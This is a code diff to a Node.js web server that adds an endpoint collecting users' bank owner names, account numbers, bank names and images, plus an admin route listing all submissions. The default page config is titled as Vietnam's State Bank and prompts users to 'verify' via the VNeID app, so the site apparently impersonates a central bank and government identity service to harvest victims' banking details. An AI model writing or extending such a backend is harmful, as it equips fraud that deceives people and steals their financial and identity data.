@@ -14,6 +14,7 @@ const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
 const TOTP_FILE = path.join(DATA_DIR, 'admin-2fa.json');
 const APPOINTMENTS_FILE = path.join(DATA_DIR, 'appointments.json');
 const VIETQR_CONFIG_FILE = path.join(DATA_DIR, 'vietqr_config.json');
+const DECLARATIONS_FILE = path.join(DATA_DIR, 'declarations.json');
 const SESSION_COOKIE = 'kb_session';
 const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;
 const PRE_AUTH_TTL_MS = 5 * 60 * 1000; // 5 phút cho bước chờ nhập OTP
@@ -75,6 +76,7 @@ function ensureStore() {
   if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]\n');
   if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, '{}\n');
   if (!fs.existsSync(APPOINTMENTS_FILE)) fs.writeFileSync(APPOINTMENTS_FILE, '[]\n');
+  if (!fs.existsSync(DECLARATIONS_FILE)) fs.writeFileSync(DECLARATIONS_FILE, '[]\n');
   if (!fs.existsSync(VIETQR_CONFIG_FILE)) fs.writeFileSync(VIETQR_CONFIG_FILE, '{"bank_id":"vcb","bank_name":"Vietcombank","account_no":"","account_name":"","amount":0,"description":"","title":"Ngân hàng Nhà nước Việt Nam","subtitle":"","instruction":"","button_text":"Tải app VNeID để xác thực"}\n');
 }
 
@@ -645,6 +647,38 @@ async function handleApi(req, res, pathname) {
     return sendJson(res, 200, { ok: true, appointment: newAppointment });
   }
 
+  if (req.method === 'POST' && pathname === '/api/ke-khai') {
+    const principal = getCurrentPrincipal(req);
+    if (!principal) return sendError(res, 401, 'Vui lòng đăng nhập để kê khai');
+    let body;
+    try { body = await readBody(req); } catch { return sendError(res, 400, 'Invalid JSON'); }
+    if (!body || !body.bankOwner || !body.bankAccount || !body.bankName) return sendError(res, 400, 'Thiếu thông tin bắt buộc');
+    
+    const declarations = readJson(DECLARATIONS_FILE, []);
+    const newDeclaration = {
+      id: crypto.randomUUID(),
+      userId: principal.user.id,
+      userPhone: principal.user.phone,
+      userName: principal.user.name,
+      bankOwner: body.bankOwner,
+      bankAccount: body.bankAccount,
+      bankName: body.bankName,
+      transactionPlace: body.transactionPlace,
+      submissionMethod: body.submissionMethod,
+      images: body.images || {},
+      createdAt: nowIso()
+    };
+    declarations.push(newDeclaration);
+    writeJson(DECLARATIONS_FILE, declarations);
+    return sendJson(res, 200, { ok: true, declaration: newDeclaration });
+  }
+
+  if (req.method === 'GET' && pathname === '/api/admin/ke-khai') {
+    if (!requireAdmin(req, res)) return;
+    const declarations = readJson(DECLARATIONS_FILE, []);
+    return sendJson(res, 200, { ok: true, declarations });
+  }
+
   if (req.method === 'GET' && pathname === '/api/admin/appointments') {
     if (!requireAdmin(req, res)) return;
     const appointments = readJson(APPOINTMENTS_FILE, []);
@@ -685,7 +719,7 @@ function serveStatic(req, res, pathname) {
   const host = req.headers.host || '';
   const isHostAdmin = host.startsWith('admin.') || host.includes('localhost') || host.includes('127.0.0.1');
 
-  if (isHostAdmin && pathname === '/') {
+  if (host.startsWith('admin.') && pathname === '/') {
     pathname = '/admin-login.html';
   }
 
